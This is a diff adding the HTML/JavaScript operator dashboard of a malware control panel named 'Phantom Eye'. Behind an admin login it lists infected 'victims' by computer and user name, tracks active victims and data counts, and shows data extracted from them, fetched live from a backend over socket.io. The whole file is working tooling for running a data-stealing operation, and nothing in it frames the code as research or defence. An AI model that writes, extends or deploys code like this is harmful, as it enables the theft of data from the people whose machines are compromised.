@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>👁️ Phantom Eye - Dashboard</title>
+    <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background: #0a0a0f; color: #e0e0e0; padding: 20px; min-height: 100vh; }
+        .header { display: flex; justify-content: space-between; align-items: center; padding: 20px; background: rgba(20,15,15,0.95); border-radius: 15px; border: 1px solid #00d060; margin-bottom: 20px; flex-wrap: wrap; gap: 10px; }
+        .header h1 { color: #00d060; font-size: 24px; }
+        .live-badge { background: #00d060; color: #0a0a0a; padding: 5px 15px; border-radius: 20px; font-size: 12px; animation: pulse 2s infinite; }
+        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin-bottom: 20px; }
+        .stat-card { background: rgba(20,15,15,0.95); padding: 20px; border-radius: 15px; border: 1px solid #333; text-align: center; }
+        .stat-number { font-size: 32px; font-weight: bold; }
+        .stat-number.total { color: #2196f3; }
+        .stat-number.active { color: #ff6b6b; }
+        .stat-number.data { color: #00d060; }
+        .stat-label { color: #888; font-size: 12px; margin-top: 5px; }
+        .card { background: rgba(20,15,15,0.95); border-radius: 15px; border: 1px solid #333; padding: 20px; margin-bottom: 20px; }
+        .card h3 { color: #00d060; margin-bottom: 15px; }
+        table { width: 100%; border-collapse: collapse; font-size: 13px; }
+        table th { text-align: left; padding: 10px; color: #888; border-bottom: 1px solid #333; }
+        table td { padding: 10px; border-bottom: 1px solid #1a1a1a; }
+        table tr:hover { background: rgba(0,212,96,0.05); }
+        .status-badge { padding: 3px 12px; border-radius: 12px; font-size: 11px; font-weight: bold; }
+        .status-badge.active { background: #ff6b6b; color: #fff; }
+        .status-badge.complete { background: #00d060; color: #0a0a0a; }
+        .grid { display: grid; grid-template-columns: 2fr 1fr; gap: 20px; }
+        .data-box { background: #1a1a1a; border-radius: 10px; padding: 15px; max-height: 500px; overflow-y: auto; font-size: 12px; font-family: 'Courier New', monospace; white-space: pre-wrap; word-break: break-all; border: 1px solid #333; }
+        .data-box .data-label { color: #00d060; font-weight: bold; margin-top: 10px; display: block; }
+        .data-box .data-value { color: #e0e0e0; }
+        .view-btn { background: #00d060; color: #0a0a0a; border: none; padding: 5px 12px; border-radius: 5px; cursor: pointer; font-weight: bold; }
+        .view-btn:hover { background: #00e070; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+        @media (max-width: 768px) { .grid { grid-template-columns: 1fr; } }
+        .login-container { display: none; justify-content: center; align-items: center; min-height: 100vh; }
+        .login-container.active { display: flex; }
+        .login-box { background: rgba(20,15,15,0.95); padding: 40px; border-radius: 20px; border: 1px solid #00d060; width: 100%; max-width: 400px; }
+        .login-box h1 { color: #00d060; text-align: center; margin-bottom: 20px; }
+        .login-box input { width: 100%; padding: 14px; margin: 10px 0; background: #1a1a1a; border: 1px solid #333; border-radius: 10px; color: #fff; font-size: 16px; }
+        .login-box input:focus { border-color: #00d060; outline: none; }
+        .login-box button { width: 100%; padding: 14px; background: #00d060; border: none; border-radius: 10px; color: #0a0a0a; font-size: 16px; font-weight: bold; cursor: pointer; }
+        .login-box button:hover { background: #00e070; }
+        .error-msg { color: #ff6b6b; text-align: center; margin-top: 10px; display: none; }
+    </style>
+</head>
+<body>
+    <!-- LOGIN -->
+    <div class="login-container active" id="loginContainer">
+        <div class="login-box">
+            <h1>👁️ PHANTOM EYE</h1>
+            <form id="loginForm">
+                <input type="text" id="username" placeholder="Username" value="admin">
+                <input type="password" id="password" placeholder="Password">
+                <button type="submit">Login</button>
+                <div class="error-msg" id="loginError">Invalid credentials</div>
+            </form>
+        </div>
+    </div>
+
+    <!-- DASHBOARD -->
+    <div class="dashboard" id="dashboard" style="display:none;">
+        <div class="header">
+            <div style="display:flex;align-items:center;gap:15px;">
+                <h1>👁️ PHANTOM EYE</h1>
+                <span class="live-badge">● LIVE</span>
+            </div>
+            <div style="display:flex;align-items:center;gap:20px;color:#888;font-size:14px;">
+                <span id="lastUpdate">Last update: Just now</span>
+            </div>
+        </div>
+
+        <div class="stats">
+            <div class="stat-card">
+                <div class="stat-number total" id="totalVictims">0</div>
+                <div class="stat-label">Total Victims</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number active" id="activeVictims">0</div>
+                <div class="stat-label">🔴 Active</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number data" id="dataPoints">0</div>
+                <div class="stat-label">📊 Data Points</div>
+            </div>
+        </div>
+
+        <div class="grid">
+            <div>
+                <div class="card">
+                    <h3>🎯 Victims <span id="victimCount" style="color:#888;font-size:14px;">(0)</span></h3>
+                    <div style="overflow-x:auto;">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>ID</th>
+                                    <th>Computer</th>
+                                    <th>User</th>
+                                    <th>Status</th>
+                                    <th>Data</th>
+                                    <th>Time</th>
+                                    <th>Action</th>
+                                </tr>
+                            </thead>
+                            <tbody id="victimsBody">
+                                <tr><td colspan="7" style="text-align:center;color:#666;">No victims yet</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+
+            <div>
+                <div class="card">
+                    <h3>📋 Extracted Data</h3>
+                    <div class="data-box" id="dataDisplay">
+                        <span style="color:#888;">Select a victim to view extracted data</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let socket = null;
+        let token = null;
+        let currentVictim = null;
+
+        // ===== LOGIN =====
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const error = document.getElementById('loginError');
+
+            try {
+                const response = await fetch('/api/admin/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username, password })
+                });
+                const data = await response.json();
+                if (data.success) {
+                    token = data.token;
+                    document.getElementById('loginContainer').classList.remove('active');
+                    document.getElementById('loginContainer').style.display = 'none';
+                    document.getElementById('dashboard').style.display = 'block';
+                    error.style.display = 'none';
+                    initDashboard();
+                } else {
+                    error.style.display = 'block';
+                }
+            } catch (e) {
+                error.style.display = 'block';
+            }
+        });
+
+        // ===== DASHBOARD =====
+        function initDashboard() {
+            socket = io();
+            socket.on('connect', () => {
+                socket.emit('authenticate', token);
+            });
+            socket.on('authenticated', (data) => {
+                if (data.success) {
+                    socket.emit('get_stats');
+                    socket.emit('get_victims');
+                }
+            });
+            socket.on('stats', (stats) => { updateStats(stats); });
+            socket.on('victims', (victims) => { updateVictims(victims); });
+            socket.on('new_victim', () => { 
+                socket.emit('get_stats'); 
+                socket.emit('get_victims');
+            });
+            socket.on('new_data', () => {
+                socket.emit('get_stats');
+                socket.emit('get_victims');
+            });
+            setInterval(() => { if (socket) { socket.emit('get_stats'); socket.emit('get_victims'); } }, 30000);
+        }
+
+        function updateStats(stats) {
+            document.getElementById('totalVictims').textContent = stats.total || 0;
+            document.getElementById('activeVictims').textContent = stats.active || 0;
+            document.getElementById('dataPoints').textContent = stats.data_points || 0;
+        }
+
+        function updateVictims(victims) {
+            const tbody = document.getElementById('victimsBody');
+            document.getElementById('victimCount').textContent = `(${victims.length})`;
+            if (!victims || victims.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;color:#666;">No victims yet</td></tr>';
+                return;
+            }
+            tbody.innerHTML = victims.map(v => `
+                <tr>
+                    <td style="font-size:11px;">${v.victim_id}</td>
+                    <td>${v.computer_name || 'Unknown'}</td>
+                    <td>${v.username || 'Unknown'}</td>
+                    <td><span class="status-badge ${v.status}">${v.status || 'active'}</span></td>
+                    <td>${v.data_count || 0}</td>
+                    <td style="font-size:11px;color:#888;">${v.first_seen ? new Date(v.first_seen).toLocaleTimeString() : 'N/A'}</td>
+                    <td><button class="view-btn" onclick="viewData('${v.victim_id}')">📊 View</button></td>
+                </tr>
+            `).join('');
+        }
+
+        async function viewData(victimId) {
+            currentVictim = victimId;
+            try {
+                const response = await fetch(`/api/admin/data/${victimId}`, {
+                    headers: { 'Authorization': `Bearer ${token}` }
+                });
+                const data = await response.json();
+                if (data.success) {
+                    const display = document.getElementById('dataDisplay');
+                    let html = `👁️ <span class="data-label">📋 Data for ${victimId}</span>\n`;
+                    data.data.forEach(item => {
+                        html += `\n<span class="data-label">📁 ${item.data_type}</span>\n`;
+                        try {
+                            const parsed = JSON.parse(item.data);
+                            html += JSON.stringify(parsed, null, 2).substring(0, 3000);
+                            if (JSON.stringify(parsed).length > 3000) html += '\n... (truncated)';
+                        } catch (e) {
+                            html += item.data.substring(0, 1500);
+                        }
+                        html += '\n';
+                    });
+                    display.textContent = html;
+                }
+            } catch (e) {
+                document.getElementById('dataDisplay').textContent = 'Error loading data';
+            }
+        }
+    </script>
+</body>
+</html>
